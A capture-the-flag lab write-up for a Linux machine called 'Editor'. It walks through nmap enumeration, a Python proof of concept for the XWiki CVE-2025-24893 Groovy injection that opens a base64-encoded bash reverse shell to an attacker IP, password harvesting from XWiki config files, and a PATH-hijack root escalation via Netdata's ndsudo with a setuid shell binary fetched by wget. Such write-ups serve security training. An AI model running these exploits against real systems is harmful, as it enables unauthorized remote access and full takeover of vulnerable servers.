# Writeup: Editor

**OS**: 🐧 Linux

**Level**: 🟢 Easy

## 🔎 Enumeration:

Nmap scan:

```shell
nmap -sS -sVC -Pn -vv -T4 -p- -oN nmap_scan $TARGET
```

Result:

```
# Nmap 7.94SVN scan initiated Wed Oct 29 03:04:42 2025 as: nmap -sS -sVC -Pn -vv -T4 -p- -oN nmap_scan 10.129.52.0
Nmap scan report for 10.129.52.0
Host is up, received user-set (0.0090s latency).
Scanned at 2025-10-29 03:04:42 CDT for 14s
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=
|   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
80/tcp   open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editor.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
8080/tcp open  http    syn-ack ttl 63 Jetty 10.0.20
|_http-open-proxy: Proxy might be redirecting requests
| http-webdav-scan: 
|   WebDAV type: Unknown
|   Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, LOCK, UNLOCK
|_  Server Type: Jetty(10.0.20)
| http-cookie-flags: 
|   /: 
|     JSESSIONID: 
|_      httponly flag not set
| http-methods: 
|   Supported Methods: OPTIONS GET HEAD PROPFIND LOCK UNLOCK
|_  Potentially risky methods: PROPFIND LOCK UNLOCK
| http-robots.txt: 50 disallowed entries (40 shown)
| /xwiki/bin/viewattachrev/ /xwiki/bin/viewrev/ 
| /xwiki/bin/pdf/ /xwiki/bin/edit/ /xwiki/bin/create/ 
| /xwiki/bin/inline/ /xwiki/bin/preview/ /xwiki/bin/save/ 
| /xwiki/bin/saveandcontinue/ /xwiki/bin/rollback/ /xwiki/bin/deleteversions/ 
| /xwiki/bin/cancel/ /xwiki/bin/delete/ /xwiki/bin/deletespace/ 
| /xwiki/bin/undelete/ /xwiki/bin/reset/ /xwiki/bin/register/ 
| /xwiki/bin/propupdate/ /xwiki/bin/propadd/ /xwiki/bin/propdisable/ 
| /xwiki/bin/propenable/ /xwiki/bin/propdelete/ /xwiki/bin/objectadd/ 
| /xwiki/bin/commentadd/ /xwiki/bin/commentsave/ /xwiki/bin/objectsync/ 
| /xwiki/bin/objectremove/ /xwiki/bin/attach/ /xwiki/bin/upload/ 
| /xwiki/bin/temp/ /xwiki/bin/downloadrev/ /xwiki/bin/dot/ 
| /xwiki/bin/delattachment/ /xwiki/bin/skin/ /xwiki/bin/jsx/ /xwiki/bin/ssx/ 
| /xwiki/bin/login/ /xwiki/bin/loginsubmit/ /xwiki/bin/loginerror/ 
|_/xwiki/bin/logout/
|_http-server-header: Jetty(10.0.20)
| http-title: XWiki - Main - Intro
|_Requested resource was http://10.129.52.0:8080/xwiki/bin/view/Main/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Oct 29 03:04:56 2025 -- 1 IP address (1 host up) scanned in 13.94 seconds
```

On port 80 i found a nginx server presenting a webpage for a code editor to download. A directory bruteforce with `gobuster` has brought nothing but a `/assets/` directory with statuscode `403`.

On port 8080 i found a Jetty server running a XWiki application. On the bottom of the webpage i found a version string (`XWiki Debian 15.10.8`), which i checked for known vulnerabilities. I found CVE-2025-24893 on [ExploitDB](https://www.exploit-db.com/exploits/52136), but the exploit failed.

## 💥 Exploitation:

I had success with this POC for CVE-2025-24893 found on [Github](https://github.com/dollarboysushil/CVE-2025-24893-XWiki-Unauthenticated-RCE-Exploit-POC), which gives me a shell as the `xwiki` user.

```python
import base64
import urllib.parse
import subprocess
import time
from colorama import init, Fore, Style

# Initialize colorama
init(autoreset=True)


def banner():
    print(Fore.CYAN + r"""    
 
   _______      ________    ___   ___ ___  _____     ___  _  _   ___   ___ ____  
  / ____\ \    / /  ____|  |__ \ / _ \__ \| ____|   |__ \| || | / _ \ / _ \___ \ 
 | |     \ \  / /| |__ ______ ) | | | ) | | |__ ______ ) | || || (_) | (_) |__) |
 | |      \ \/ / |  __|______/ /| | | |/ /|___ \______/ /|__   _> _ < \__, |__ < 
 | |____   \  /  | |____    / /_| |_| / /_ ___) |    / /_   | || (_) |  / /___) |
  \_____|   \/   |______|  |____|\___/____|____/    |____|  |_| \___/  /_/|____/ 
                                                                                 
                                                                                 

""" + Fore.YELLOW + "           CVE-2025-24893 - XWiki Groovy RCE Exploit")
    print(Fore.YELLOW + "                   exploit by @dollarboysushil\n")


def send_curl_request(url):
    print(Fore.CYAN + "\n[+] Sending exploit via curl...\n")
    try:
        result = subprocess.run(
            ["curl", "-i", url],
            capture_output=True,
            text=True,
            timeout=10
        )

        if "200 OK" in result.stdout:
            print(Fore.GREEN +
                  "[+] Exploit delivered successfully! Check your listener.")
        else:
            print(
                Fore.RED + "[-] Exploit may not have succeeded (non-200 response).")

    except subprocess.TimeoutExpired:
        print(Fore.RED + "[-] Curl timed out!")
    except Exception as e:
        print(Fore.RED + "[-] Curl request failed:", e)


# Show banner
banner()

# Inputs
url = input(
    Fore.CYAN + "[?] Enter target URL (including http:// or https:// e.g http://10.10.10.18.10:8080): ")
ip = input(Fore.CYAN + "[?] Enter your IP address (for reverse shell): ")
port = input(Fore.CYAN + "[?] Enter the port number: ")

print(Fore.YELLOW + "\n[+] Crafting malicious reverse shell payload...")
time.sleep(1)

# Reverse shell payload
revshell = f"bash -c 'sh -i >& /dev/tcp/{ip}/{port} 0>&1'"
base64_revshell = base64.b64encode(revshell.encode()).decode()

# Groovy payload
payload = (
    f"}}}}}}{{{{async async=false}}}}{{{{groovy}}}}"
    f"\"bash -c {{echo,{base64_revshell}}}|{{base64,-d}}|{{bash,-i}}\".execute()"
    f"{{{{/groovy}}}}{{{{/async}}}}"
)

# Encode payload (preserve some special chars)
encoded_payload = urllib.parse.quote(payload, safe="=,-,")

# Final URL
exploit = f"{url}/xwiki/bin/get/Main/SolrSearch?media=rss&text={encoded_payload}"

# Show example
print(Fore.LIGHTBLACK_EX +
      "\n[+] Sample Format:\n    http://target/xwiki/bin/get/Main/SolrSearch?media=rss&text=<payload>")

# Display exploit
print(Fore.MAGENTA + "\n[+] Final Exploit URL:\n" + Fore.WHITE + exploit)

# Send the curl request
time.sleep(1)
send_curl_request(exploit)

print(Fore.YELLOW +
      "\n[+] Done. Awaiting reverse shell connection on " + ip + ":" + port + " ...\n")
```

## 🔓 Priviledge Escalation:

Since there is a XWiki application running, i have done some research to find out where to look for saved credentials and i have found the password `theEd**********` using `grep`.

```shell
grep -Ri 'password' /etc/xwiki/

/etc/xwiki/hibernate.cfg.xml:    <property name="hibernate.connection.password">theEd**********</property>
/etc/xwiki/hibernate.cfg.xml:    <property name="hibernate.connection.password">xwiki</property>
...
```

I also found out that there is a user `oliver` on the machine.

```shell
cat /etc/passwd | grep sh
root:x:0:0:root:/root:/bin/bash
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
oliver:x:1000:1000:,,,:/home/oliver:/bin/bash
```

I have tried to ssh in to the machine as user `oliver` and the password found inside the XWiki config files and had success. I was able to grab the `user.txt` inside of the home directory of the user `oliver`.

I have looked for SUID binaries. `ndsudo` has catched my attention so i checked it on GTFObins, but did not found anything. After playing around with the binary i found out, that running the binary with the `megacli-disk-info` argument gives me a error message which indicates a possible path hijacking.

```
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo megacli-disk-info

megacli MegaCli : not available in PATH.
```

I have compiled following c code on my machine (`gcc megacli.c -o megacli`).

```c
#include <unistd.h>
#include <stdlib.h>

int main() {
    setuid(0);
    setgid(0);
    execl("/bin/bash", "bash", "-i", NULL);
    
    return 0;
}
```

I downloaded the binary on the target and exported the PATH variable. Then i runned the `ndsudo` binary again and got a shell as `root` and was able to read the `root.txt`.

```shell
cd /tmp
wget http://10.10.10.10:8080/megacli
chmod +x megacli
export PATH=/tmp:$PATH
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo megacli-disk-info
cat /root/root.txt
```

## 💰 Loot:

```shell
# user.txt
839fe649adf65681d92cc0**********

# root.txt
bb62b52b4bb18f5ecfd77c**********
```